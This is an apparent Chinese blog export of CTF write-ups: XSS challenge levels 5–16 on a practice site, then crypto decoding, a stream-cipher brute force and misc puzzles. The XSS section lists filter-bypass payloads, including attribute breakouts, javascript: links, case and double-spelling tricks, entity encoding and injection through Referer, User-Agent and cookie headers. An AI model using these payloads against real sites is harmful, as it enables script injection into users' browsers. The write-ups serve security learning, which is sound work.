<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>输入<code>&lt;script &quot; &#39;Oonn&gt;</code>搜索框里变成<code>&lt;scr_ipt </code><br>源代码<code>value=&quot;&lt;scr_ipt &quot; &#39;oo_nn&gt;&quot;</code>介个似协模意思捏。。<br>首先哈，大于小于没被转义也没被过滤，然后哈，应该是双引号闭合<br>输<code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code>源代码是<code>value=&quot;&quot;&gt;&lt;scr_ipt&gt;alert()&lt;/script&gt;&lt;&quot;&quot;</code><br>输<code>&quot;onmouseover=&quot;alert()</code>源代码是<code>value=&quot;&quot;o_nmouseover=&quot;alert()&quot;</code><br>但是试了<code>&lt;a href=&quot;javascript:alert()&quot;&gt;</code>可以发现是可行的<br>构建，先双引号<code>&quot;</code>然后<code>&gt;</code>和左边闭合，然后<code>&lt;a href=&quot;javascript:alert()&quot;&gt;</code>，<code>&lt;</code>和右边闭合<br><code>&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt;&lt;</code>铛铛出炉</p>
<p>先做到这，明天继续</p>
<h3 id="2023-7"><a href="#2023-7" class="headerlink" title="2023.7"></a>2023.7</h3><p>虽然当时打算继续做下去。。但是我一学期后才回来（阿这</p>
<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>大小写绕过<br><code>&quot;&gt;&lt;a Href=&quot;javaScript:alert()&quot;&gt;&lt;</code></p>
<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>把上一个输进去发现用了小写转化<br>试了一下发现还会检测<code>on``script``herf</code>然后删掉，双拼写绕过<br><code>&quot;&gt;&lt;a hrhrefef=&quot;javascrscriptipt:alert()&quot;&gt;&lt;</code></p>
<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>小写转化、过滤了script,href什么的、双引号被编码<br>看了一下会把输入的填进href,搞个&amp;#十进制ASCII<br><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#83;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</code><br>或者&amp;#十六进制ASCII<code>&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0027;&amp;#x0078;&amp;#x0073;&amp;#x0073;&amp;#x0027;&amp;#x0029;</code></p>
<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>双引号,尖括号,还说我链接不合法<br>浅试了个<code>http://</code>,可以<br>试了一下发现payload里只要有<code>http://</code>就可以,不管怎么放,估计是匹配了<code>http://</code><br>把上一题的尾巴后面注释个<code>//http://</code><br><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#83;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;//http://</code></p>
<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>没框,可能是用图片<br>看看源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>有三个隐藏的框,F12把hidden删了,试个<code>&amp;t_link=1&amp;t_history=2&amp;t_sort=3</code>,发现<code>t_sort</code>框里有回显</p>
<p><code>&amp;t_sort=&quot; onclick=&#39;javascript:alert(1)&#39;&gt;</code>再把hidden删了</p>
<p>AND还有可以直接改类型,不用一次次删hidden<br><code>&amp;t_sort=&quot; type=&#39;text&#39; onclick=&#39;javascript:alert(1)&#39;&gt;</code></p>
<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>看看源码,四个框框<br><code>t_link=&quot; type=&#39;text&#39;&gt;&amp;t_history=&quot; type=&#39;text&#39;&gt;&amp;t_sort=&quot; type=&#39;text&#39;&gt;&amp;t_ref=&quot; type=&#39;text&#39;</code><br>没反应<br>再看一眼源码,双引号被转义了<br>然后t_ref的值<br><code>&lt;input name=&quot;t_ref&quot;  value=&quot;https://xss.tesla-space.com/level10.php?keyword=&amp;t_sort=%22%20onclick=%27javascript:alert(1)%27%3E&quot; type=&quot;hidden&quot;&gt;</code><br>然后hackbar可以看到referer的值就是变成了<code>https://xss.tesla-space.com/level10.php?keyword=&amp;t_sort=%22%20onclick=%27javascript:alert(1)%27%3E</code><br>遂改之<code>&quot; type=&#39;text&#39; onclick=&#39;javascript:alert(1)&#39;&gt;</code></p>
<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>还是没有框框,看看源码<br>有个<code>t_ua</code>,改个User-Agent头看看<br>拒绝访问<br>不改,直接在后面加payload</p>
<h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>看源码,<code>t_cook</code>,改个cookie看看<br><code>user=&quot; type=&#39;text&#39; onclick=&#39;javascript:alert(1)&#39;&gt;</code></p>
<h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p><code>&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;https://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;</code><br><a href="https://www.exifviewer.org/%E6%89%93%E4%B8%8D%E5%BC%80">https://www.exifviewer.org/打不开</a><br>不知道要干嘛就是</p>
<h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p><code>&lt;body&gt;&lt;span class=&quot;ng-include:1.gif&quot;&gt;&lt;/span&gt;&lt;/body&gt; </code><br><a href="https://blog.csdn.net/u011127019/article/details/53666528">ng-include指令</a><br>尖括号被转义<br>html包一下<code>%27https://xss.tesla-space.com/level1.php?name=&lt;img src=asd onerror=alert(1)&gt;%27</code></p>
<h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>过滤了斜杠,空格,Script啥的<br>btw本题配图好眼熟,看到它我就想起了我电脑重置后失踪的steam和不知为何明明是在steam上下的,却离奇留下的portal(显然只留了个壳打不开)<br>找找不用斜杠&#x2F;Script的payload,然后空格编码%0a<br><a href="https://websec.readthedocs.io/zh/latest/vuln/xss/payload.html">4.2.10. Payload — Web安全学习笔记 1.0 文档</a><br><code>&lt;img%0asrc=1%0aonerror=alert(1)&gt;</code></p>
<h3 id="level17-20"><a href="#level17-20" class="headerlink" title="level17-20"></a>level17-20</h3><p>啥啊该插件不受支持,我再研究研究</p>
]]></content>
      <categories>
        <category>做题记录</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>CryptoHack部分WriteUp</title>
    <url>/2023/01/15/Introduction-to-CryptoHack%E9%83%A8%E5%88%86Write-Up/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不会吧不会吧不会这都不对吧" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="2e8f24ea302a05056df4131b3380bebe8a712eaa4530961647e851ab0dccd8d8"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password就是password捏🤗</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>做题记录</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>ROIS冬令营第一周WriteUp</title>
    <url>/2023/01/14/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E7%AC%AC%E4%B8%80%E5%91%A8Write-Up/</url>
    <content><![CDATA[<p>（1.16有更新）ROIS冬令营第一周Write Up</p>
<span id="more"></span>
<p>废话很多。。</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Week1-HTTPtest"><a href="#Week1-HTTPtest" class="headerlink" title="[Week1]HTTPtest"></a>[Week1]HTTPtest</h3><ol>
<li>这是什么？bp抓一下！这是什么？bp抓一下！这是什么？bp抓一下！这是什么？bp抓一下！这是什么？bp抓一下！这是什么？bp抓一下！这是什么？bp抓一下！这是什么？bp抓一下！</li>
<li>Response里面可以看到：flag: I can only give you flag with the browser of <code>ROIS_browser</code></li>
<li>由题意得，把Request的User-Agent改成<code>ROIS_browser</code></li>
</ol>
<h3 id="Week1-ViewSource"><a href="#Week1-ViewSource" class="headerlink" title="[Week1]ViewSource"></a>[Week1]ViewSource</h3><p>view-source是一种协议，可以查看网页源代码</p>
<ol>
<li>在浏览器地址栏前面加上view-source:<br><del>btw其实我是上一题刚做完顺手在bp抓的</del></li>
<li>可以从源代码看出来，它大概的意思是它用一串函数复合表达了my_flag，但是没有明确打出来它完整的样子</li>
<li>在&lt; script&gt;里面&lt; &#x2F;script&gt;给它加个JavaScript的输出函数alert()<br><del>alert(my_flag)</del></li>
<li>🤗🤗🤗🤗</li>
</ol>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Week1-0-amp-1"><a href="#Week1-0-amp-1" class="headerlink" title="[Week1] 0&amp;1"></a>[Week1] 0&amp;1</h3><p>因为没学过python，所以不知道有没有简单的方式，我是最基础的思路</p>
<ol>
<li><p>首先，先把二进制八位八位的分开，每八个转一次十进制再转成相应的ASCII码</p>
</li>
<li><p>显然易得，出来的是十六进制，hex解一下</p>
</li>
<li><p>然后可以看出来这一层是base64加密，再解一下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">bin</span> = <span class="string">&#xx27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bins = [<span class="built_in">bin</span>[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">bin</span>), <span class="number">8</span>)]</span><br><span class="line"><span class="comment"># 将字符串每八位分割</span></span><br><span class="line"></span><br><span class="line">decs = [<span class="built_in">int</span>(b, <span class="number">2</span>) <span class="keyword">for</span> b <span class="keyword">in</span> bins]</span><br><span class="line"><span class="comment"># 将每八位二进制转换为十进制</span></span><br><span class="line"></span><br><span class="line">ascs = [<span class="built_in">chr</span>(d) <span class="keyword">for</span> d <span class="keyword">in</span> decs]</span><br><span class="line"><span class="comment"># 将每个十进制数字转换为相应的ASCII码</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;&#x27;</span>.join(ascs)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment"># 输出第一次解密结果</span></span><br><span class="line"></span><br><span class="line">hex_str = binascii.unhexlify(<span class="built_in">str</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># hex解密</span></span><br><span class="line"><span class="built_in">print</span>(hex_str)</span><br><span class="line"><span class="comment"># 输出第二次解密结果</span></span><br><span class="line"></span><br><span class="line">b64_str = base64.b64decode(hex_str)</span><br><span class="line"><span class="comment"># base64解密</span></span><br><span class="line"><span class="built_in">print</span>(b64_str)</span><br><span class="line"><span class="comment"># 输出最后结果</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>btw，不写代码的方式：<br>二进制转ASCII<br><a href="https://www.lddgo.net/convert/string-binary">https://www.lddgo.net/convert/string-binary</a><br>hex解码<br><a href="http://tool.geekapp.cn/hex.php">http://tool.geekapp.cn/hex.php</a><br>base64解码<br><a href="https://base64.us/">https://base64.us/</a></p>
<h3 id="Week1-Aniely"><a href="#Week1-Aniely" class="headerlink" title="[Week1]Aniely"></a>[Week1]Aniely</h3><p>这题我捋了一下题干，感觉应该是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from secret import passphrase, flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#我完全没学过的知识告诉我。。呃啊完全看不懂啊救救孩子</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#这段应该是将passphrase加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aniely_stream</span>(<span class="params">passphrase</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">mixer</span>(<span class="params">u, v</span>):</span><br><span class="line">		<span class="keyword">return</span> ((u &lt;&lt; v) &amp; <span class="number">0xffffffff</span>) | u &gt;&gt; (<span class="number">32</span> - v)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">forge</span>(<span class="params">w, a, b, c, d</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">			w[a] = (w[a] + w[b]) &amp; <span class="number">0xffffffff</span></span><br><span class="line">			w[d] = mixer(w[a] ^ w[d], <span class="number">16</span> // (i + <span class="number">1</span>))</span><br><span class="line">			w[c] = (w[c] + w[d]) &amp; <span class="number">0xffffffff</span></span><br><span class="line">			w[b] = mixer(w[b] ^ w[c], (<span class="number">12</span> + <span class="number">2</span>*i) // (i + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">	bring = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">	bring[:<span class="number">4</span>] = [<span class="number">0x61707865</span>, <span class="number">0x3320646e</span>, <span class="number">0x79622d32</span>, <span class="number">0x6b206574</span>]</span><br><span class="line">	bring[<span class="number">4</span>:<span class="number">12</span>] = unpack(<span class="string">&#x27;&lt;8L&#x27;</span>, passphrase)</span><br><span class="line">	bring[<span class="number">12</span>] = bring[<span class="number">13</span>] = <span class="number">0x0</span></span><br><span class="line">	bring[<span class="number">14</span>:] = [<span class="number">0</span>] * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		w = <span class="built_in">list</span>(bring)</span><br><span class="line">		<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">			forge(w, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0xc</span>)</span><br><span class="line">			forge(w, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0xd</span>)</span><br><span class="line">			forge(w, <span class="number">0x2</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0xe</span>)</span><br><span class="line">			forge(w, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0xf</span>)</span><br><span class="line">			forge(w, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0xf</span>)</span><br><span class="line">			forge(w, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0xc</span>)</span><br><span class="line">			forge(w, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0xd</span>)</span><br><span class="line">			forge(w, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0xe</span>)</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> pack(<span class="string">&#x27;&lt;16L&#x27;</span>, *((w[_] + bring[_]) &amp; <span class="number">0xffffffff</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>))):</span><br><span class="line">			<span class="keyword">yield</span> c</span><br><span class="line">		bring[<span class="number">12</span>] = (bring[<span class="number">12</span>] + <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">		<span class="keyword">if</span> bring[<span class="number">12</span>] == <span class="number">0</span>:</span><br><span class="line">			bring[<span class="number">13</span>] = (bring[<span class="number">13</span>] + <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aniely_encrypt</span>(<span class="params">msg, passphrase</span>):</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(passphrase) &lt; <span class="number">32</span>:</span><br><span class="line">		<span class="comment">#如果passphrase长度小于32</span></span><br><span class="line">		passphrase = (passphrase * (<span class="number">32</span> // <span class="built_in">len</span>(passphrase) + <span class="number">1</span>))[:<span class="number">32</span>]</span><br><span class="line">		<span class="comment">#则将passphrase字符串重复多次</span></span><br><span class="line">		<span class="comment">#直到它的长度达到32，然后取前32个字符</span></span><br><span class="line">		<span class="comment">#最终将passphrase字符串变成32位长度的字符串</span></span><br><span class="line">	rand = urandom(<span class="number">2</span>) * <span class="number">16</span></span><br><span class="line">	<span class="comment">#urandom(2)是生成2个字节的随机数，乘以16获得一个范围在0到32之间的随机数（大概？</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">bytes</span>(a ^ b ^ c <span class="keyword">for</span> a, b, c <span class="keyword">in</span> <span class="built_in">zip</span>(msg, aniely_stream(passphrase), rand))</span><br><span class="line">	<span class="comment">#使用zip函数将msg，aniely_stream（passphrase）和rand三个参数进行拉链</span></span><br><span class="line">	<span class="comment">#然后使用异或运算对拉链中的每个元素进行运算</span></span><br><span class="line">	<span class="comment">#最后将运算结果以字节形式返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里有百度：</span></span><br><span class="line"><span class="comment">#密钥流是一种加密技术，它使用一个密钥流来加密和解密数据。</span></span><br><span class="line"><span class="comment">#其原理是，它将一个随机生成的密钥流与要加密的数据进行异或运算，以生成加密后的数据。</span></span><br><span class="line"><span class="comment">#解密时，只要将加密后的数据与密钥流再次进行异或运算，就可以得到原始数据。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(passphrase, flag))</span><br><span class="line"><span class="comment">#zip函数将passphrase和flag这两个对应的元素打包成元组</span></span><br><span class="line"><span class="comment">#然后使用列表推导式将元组中的元素进行异或运算，并将结果转换为字节形式，赋值给key</span></span><br><span class="line">enc = aniely_encrypt(passphrase, key)</span><br><span class="line"><span class="comment">#用aniely_encrypt将passphrase和flag加密后赋给enc</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;key = <span class="subst">&#123;key.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc = <span class="subst">&#123;enc.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#hex加密一下print出来</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;4dcceb8802ae3c45fe80ccb364c8de19f2d39aa8ebbfb0621623e67aba8ed5bc&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;e67a67efee3a80b66af0c33260f96b38e4142cd5d9426f6f156839f2e2a8efe8&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>首先有两个东西，一个叫passphrase一个叫flag，但咱现在不知道，是咱现在要求的<br>咱只知道key和enc<br>key是：</p>
<ol>
<li>用zip函数将passphrase和flag这两个对应的元素打包成元组</li>
<li>然后使用列表推导式将元组中的元素进行异或运算</li>
<li>并将结果转换为字节形式，赋值给key</li>
</ol>
<p>enc就复杂了，enc是：</p>
<ol>
<li>判断得到的key长度是否小于32，若小于则将字符串重复多次，直至字符串大于等于32，取前面32位</li>
<li>用上面定义的aniely_stream加密key（咋加密还在理解</li>
<li>生成一个随机数rand</li>
<li>将用zip函数将（passphrase，加密后的key，rand）拉链，异或运算对拉链中的每个元素进行运算</li>
<li>返回的值即为enc</li>
</ol>
<p>我的思路：</p>
<ol>
<li>key和enc解一下hex</li>
<li>判断得到的key长度是否小于32，若小于则将字符串重复多次，直至字符串大于等于32，取前面32位</li>
<li>用上面定义的aniely_stream加密key（咋加密的应该不用理解太仔细吧（是的我没理解</li>
<li>enc&#x3D;(aniely_stream加密后的key)^passphrase^rand</li>
<li>所以passphrase&#x3D;enc^(aniely_stream加密后的key)^rand</li>
<li>因为key&#x3D;passphrase^flag，所以把求出来的passphrase^key即为所求flag</li>
<li>很不幸里面的rand是随机数所以我们需要爆破一下</li>
<li>大概是：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passphrase = bytes(a ^ b ^ c for a, b, c in zip(enc, aniely_stream(key), rand))</span><br><span class="line">flag = bytes(a ^ b for a, b in zip(passphrase, key))</span><br></pre></td></tr></table></figure></li>
<li>刚好题干给了咱一个<code>itertools.islice()</code>我们可以用它对rand进行爆破<br>。。。好吧我承认到这一步我真不会了。。。我一头雾水学了半天（这里的半天是实指）没明白最后我去搜了我有罪<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> rand <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">256</span>), repeat=<span class="number">2</span>):</span><br><span class="line">    rand = <span class="built_in">bytes</span>(rand) * <span class="number">16</span></span><br></pre></td></tr></table></figure></li>
<li>然后最后如果flag出现CCTF的字样，则输出flag<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (flag.startswith(<span class="string">b&#x27;CCTF&#x27;</span>)):</span><br><span class="line">	<span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
这一步卡了半天因为我一开始开头没有b，这混帐玩意儿老给我报错😅<br><strong>因为flag是一个字节串，加上b的意思是表示以字节的形式来检测</strong></li>
</ol>
<p>最后附上我的代码。。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aniely_stream</span>(<span class="params">passphrase</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">mixer</span>(<span class="params">u, v</span>):</span><br><span class="line">		<span class="keyword">return</span> ((u &lt;&lt; v) &amp; <span class="number">0xffffffff</span>) | u &gt;&gt; (<span class="number">32</span> - v)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">forge</span>(<span class="params">w, a, b, c, d</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">			w[a] = (w[a] + w[b]) &amp; <span class="number">0xffffffff</span></span><br><span class="line">			w[d] = mixer(w[a] ^ w[d], <span class="number">16</span> // (i + <span class="number">1</span>))</span><br><span class="line">			w[c] = (w[c] + w[d]) &amp; <span class="number">0xffffffff</span></span><br><span class="line">			w[b] = mixer(w[b] ^ w[c], (<span class="number">12</span> + <span class="number">2</span>*i) // (i + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">	bring = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">	bring[:<span class="number">4</span>] = [<span class="number">0x61707865</span>, <span class="number">0x3320646e</span>, <span class="number">0x79622d32</span>, <span class="number">0x6b206574</span>]</span><br><span class="line">	bring[<span class="number">4</span>:<span class="number">12</span>] = unpack(<span class="string">&#x27;&lt;8L&#x27;</span>, passphrase)</span><br><span class="line">	bring[<span class="number">12</span>] = bring[<span class="number">13</span>] = <span class="number">0x0</span></span><br><span class="line">	bring[<span class="number">14</span>:] = [<span class="number">0</span>] * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		w = <span class="built_in">list</span>(bring)</span><br><span class="line">		<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">			forge(w, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0xc</span>)</span><br><span class="line">			forge(w, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0xd</span>)</span><br><span class="line">			forge(w, <span class="number">0x2</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0xe</span>)</span><br><span class="line">			forge(w, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0xf</span>)</span><br><span class="line">			forge(w, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0xf</span>)</span><br><span class="line">			forge(w, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0xc</span>)</span><br><span class="line">			forge(w, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0xd</span>)</span><br><span class="line">			forge(w, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0xe</span>)</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> pack(<span class="string">&#x27;&lt;16L&#x27;</span>, *((w[_] + bring[_]) &amp; <span class="number">0xffffffff</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>))):</span><br><span class="line">			<span class="keyword">yield</span> c</span><br><span class="line">		bring[<span class="number">12</span>] = (bring[<span class="number">12</span>] + <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">		<span class="keyword">if</span> bring[<span class="number">12</span>] == <span class="number">0</span>:</span><br><span class="line">			bring[<span class="number">13</span>] = (bring[<span class="number">13</span>] + <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;4dcceb8802ae3c45fe80ccb364c8de19f2d39aa8ebbfb0621623e67aba8ed5bc&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;e67a67efee3a80b66af0c33260f96b38e4142cd5d9426f6f156839f2e2a8efe8&#x27;</span></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(enc)</span><br><span class="line"></span><br><span class="line">key1 = (key * (<span class="number">32</span> // <span class="built_in">len</span>(key) + <span class="number">1</span>))[:<span class="number">32</span>]</span><br><span class="line"><span class="comment">#将字符串重复多次，直到它的长度达到32，然后取前32个字符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rand <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">256</span>), repeat=<span class="number">2</span>):</span><br><span class="line">	rand = <span class="built_in">bytes</span>(rand) * <span class="number">16</span></span><br><span class="line">	<span class="comment">#是的这一部分还没明白，还在研究ing</span></span><br><span class="line">	key2 = aniely_stream(key1)</span><br><span class="line">	passphrase = <span class="built_in">bytes</span>(a ^ b ^ c <span class="keyword">for</span> a, b, c <span class="keyword">in</span> <span class="built_in">zip</span>(enc, key2, rand))</span><br><span class="line">	flag = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(passphrase, key))</span><br><span class="line">	<span class="keyword">if</span> (flag.startswith(<span class="string">b&#x27;CCTF&#x27;</span>)):</span><br><span class="line">		<span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>虽然搜了一部分（而且感觉搜的部分是最重要的。。。）但是还是有努力再搜的（目移。。<br>说起来这是非预期解法吗？我完全想不到其他解法。。也可能我刚学，脑袋里只有xor所以是这个思路<br>不管了先去吃饭。。。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Two-Dimensional"><a href="#Two-Dimensional" class="headerlink" title="Two Dimensional"></a>Two Dimensional</h3><ol>
<li>一团乱码，看起来像base64，随便找个网站解一下字符串，看到前边开头是PNG。。显然。。是png文件。。。<br>2.找个base64转十六进制的网站<br>belike：<br><a href="https://tool.hiofd.com/base64-convert-hex-online/">https://tool.hiofd.com/base64-convert-hex-online/</a></li>
<li>把结果导到winhex里面保存为.png后缀的文件</li>
<li>打开一看是个缺了一角的二维码，补齐就好了<br><del>我不会说我ps没使明白最后是开画板画上那个角的。。</del></li>
